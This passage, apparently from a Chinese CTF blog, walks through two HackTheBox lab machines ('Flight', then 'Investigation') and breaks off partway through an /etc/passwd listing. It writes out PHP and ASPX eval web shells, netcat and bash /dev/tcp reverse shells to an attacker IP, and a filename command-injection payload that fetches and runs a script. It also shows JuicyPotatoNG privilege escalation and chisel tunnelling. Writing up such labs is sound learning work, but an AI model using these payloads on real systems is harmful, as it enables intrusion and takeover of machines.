<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;&#x27;</span> &gt; BFL.php</span><br><span class="line">smbclient //10.10.11.187/web -U c.bum --password=Tikkycoll_431012284</span><br><span class="line"><span class="built_in">cd</span> school.flight.htb</span><br><span class="line">put BFL.php</span><br></pre></td></tr></table></figure>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs/">https://github.com/antonioCoco/RunasCs/</a></p>
</blockquote>
<p>使用蚁剑上传runascs后运行</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runascs.exe c.bum Tikkycoll_431012284 powershell -r <span class="number">10</span>.<span class="number">10</span>.*.*:<span class="number">9998</span></span><br></pre></td></tr></table></figure>
<p>查看user.txt</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> /users/c.bum/desktop/user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">970e7b5b8f6e538ede217e98f6e33832</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-24"><a class="markdownIt-Anchor" href="#权限提升-24"></a> 权限提升</h2>
<p>收集系统信息</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Host Name:                 G0</span><br><span class="line">OS Name:                   Microsoft Windows Server 2019 Standard</span><br><span class="line">OS Version:                10.0.17763 N&#x2F;A Build 17763</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Primary Domain Controller</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows User</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00429-00521-62775-AA402</span><br><span class="line">Original Install Date:     7&#x2F;20&#x2F;2021, 11:21:49 AM</span><br><span class="line">System Boot Time:          3&#x2F;10&#x2F;2023, 7:46:45 AM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              2 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz</span><br><span class="line">                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8&#x2F;7&#x2F;2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume3</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              it;Italian (Italy)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     4,095 MB</span><br><span class="line">Available Physical Memory: 2,046 MB</span><br><span class="line">Virtual Memory: Max Size:  5,503 MB</span><br><span class="line">Virtual Memory: Available: 3,361 MB</span><br><span class="line">Virtual Memory: In Use:    2,142 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    flight.htb</span><br><span class="line">Logon Server:              N&#x2F;A</span><br><span class="line">Hotfix(s):                 N&#x2F;A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0 2</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.11.187</span><br><span class="line">                                 [02]: fe80::c88d:96af:ef3d:fb9f</span><br><span class="line">                                 [03]: dead:beef::c88d:96af:ef3d:fb9f</span><br><span class="line">                                 [04]: dead:beef::250</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure>
<p>查看TCP监听端口</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant | <span class="built_in">findstr</span> TCP | <span class="built_in">findstr</span> <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49690          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49693          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49702          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    10.10.11.187:53        0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    10.10.11.187:139       0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       InHost</span><br></pre></td></tr></table></figure>
<p>与nmap扫描结果对比好像多了个8000？</p>
<p>本机上测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I -v http://10.10.11.187:8000/</span><br></pre></td></tr></table></figure>
<p>没有响应</p>
<p>靶机上测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://0.0.0.0:8000/</span><br><span class="line">curl : Unable to connect to the remote server</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:8000/</span><br><span class="line">curl : &lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt; </span><br></pre></td></tr></table></figure>
<p>估计是要做个端口转发了</p>
<p><s>用LCX搭端口转发死活搭不上，麻了</s></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p>
</blockquote>
<p>本机运行服务端，开启HTTP服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel_1.8.1_linux_amd64 server -p 8888 --reverse &amp;</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<p>下载并运行客户端</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.*.*/chisel_1.<span class="number">8</span>.<span class="number">1</span>_windows_amd64&quot; -OutFile &quot;./chisel.exe&quot;</span><br><span class="line">./chisel.exe client <span class="number">10</span>.<span class="number">10</span>.*.*:<span class="number">8888</span> R:<span class="number">8000</span>:<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure>
<p>将客户端的127.0.0.1:8000转发至服务端0.0.0.0:8000</p>
<p>访问<code>http://0.0.0.0:8000/</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Physical Path	   C:\inetpub\development</span><br></pre></td></tr></table></figure>
<p>IIS服务，得到路径</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> c:\inetpub\development</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    Directory: C:\inetpub\development</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                development </span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> C:\inetpub\development\development</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    Directory: C:\inetpub\development\development</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                css</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                fonts</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                img</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                js</span><br><span class="line">-a----        4&#x2F;16&#x2F;2018   2:23 PM           9371 contact.html</span><br><span class="line">-a----        4&#x2F;16&#x2F;2018   2:23 PM          45949 index.html</span><br></pre></td></tr></table></figure>
<p>尝试了以下，对路径有写权限</p>
<p>写入aspx WebShell</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Content -<span class="built_in">Path</span> &quot;C:\inetpub\development\development\BFL.aspx&quot; -Value &#x27;&lt;%@ Page Language=&quot;Jscript&quot;<span class="variable">%&gt;&lt;%</span>eval(Request.Item[&quot;BFL&quot;],&quot;unsafe&quot;);%&gt;&#x27;</span><br></pre></td></tr></table></figure>
<p>蚁剑连接后上传nc.exe</p>
<p><s>一开始找个nc不支持-e选项，笑嘻了</s></p>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure>
<p>反弹Shell</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span> /c <span class="built_in">start</span> nc.exe -e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span> <span class="number">9997</span></span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State   </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain                Disabled</span><br><span class="line">SeAuditPrivilege              Generate security audits                  Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br></pre></td></tr></table></figure>
<p><code>SeImpersonatePrivilege</code>，一眼juicypotato</p>
<p>老的juicypotato好像对<code>Microsoft Windows Server 2019 Standard</code>无效</p>
<p>下载JuicyPotatoNG，解压并开启http服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip</span><br><span class="line">unzip JuicyPotatoNG.zip</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure>
<p>下载JuicyPotatoNG.exe和nc.exe，运行juicypotatong</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span>/JuicyPotatoNG.exe&quot; -OutFile &quot;./JuicyPotatoNG.exe&quot;</span><br><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span>/nc.exe&quot; -OutFile &quot;./nc.exe&quot;</span><br><span class="line">./juicypotatoNG.exe -t t -p &quot;./nc.exe&quot; -a &quot;-e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">10</span>.*.* <span class="number">9995</span></span><br></pre></td></tr></table></figure>
<p>获得反弹shell，查看root.txt</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f54fcef08f4ea67c6c7b406b2170b354</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>端口转发工具</p>
</blockquote>
<p>之前的lcx工具弄丢了，现在找的交叉编译跟Windows环境编译都能通过，但是都用不了</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/windworst/LCX">https://github.com/windworst/LCX</a><br />
<a target="_blank" rel="noopener" href="https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe">https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe</a></p>
</blockquote>
<p>搞半天连不通<br />
网上找下第一个编译成elf第二个直接用还能连上，就这样吧</p>
<hr />
<h1 id="hackthebox_investigation"><a class="markdownIt-Anchor" href="#hackthebox_investigation"></a> HackTheBox_Investigation</h1>
<h2 id="信息收集-9"><a class="markdownIt-Anchor" href="#信息收集-9"></a> 信息收集</h2>
<h3 id="端口扫描-26"><a class="markdownIt-Anchor" href="#端口扫描-26"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.197</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.197</span><br><span class="line">Host is up (1.2s latency).</span><br><span class="line">Not shown: 835 closed ports, 163 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41</span><br><span class="line">Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h3 id="路径枚举-6"><a class="markdownIt-Anchor" href="#路径枚举-6"></a> 路径枚举</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://10.10.11.197</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Date: Tue, 21 Mar 2023 11:51:08 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">Location: http:&#x2F;&#x2F;eforenzics.htb&#x2F;</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br></pre></td></tr></table></figure>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.197\teforenzics.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>未枚举出有效路径</p>
<h2 id="漏洞利用-24"><a class="markdownIt-Anchor" href="#漏洞利用-24"></a> 漏洞利用</h2>
<p>请求<code>http://eforenzics.htb/service.html</code></p>
<p>上传文件功能位于<code>http://eforenzics.htb/upload.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<p>burpsuite中使用以下文件名进行RCE</p>
<p><code>filename=&quot;|`curl 10.10.16.8?BFL`|&quot;</code></p>
<p>本地httpserver接收到请求</p>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure>
<p>反弹Shell语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.*.*/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/BFL</span><br></pre></td></tr></table></figure>
<p>使用以下格式的文件名进行反弹Shell</p>
<p><code>filename=&quot;|`echo $BASE64_PAYLOAD | base64 -d`|&quot;</code></p>
<p>Base64编码前的命令如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.*.*/BFL -o /tmp/BFL</span><br><span class="line">bash /tmp/BFL</span><br></pre></td></tr></table></figure>
<p>接收到Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:112::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:115::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:112:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">smorton:x:1000:1000:eForenzics:&#x2F;home&#x2F;smorton:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">backup:x:34:34::&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">fwupd-refresh:x:113:119:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span 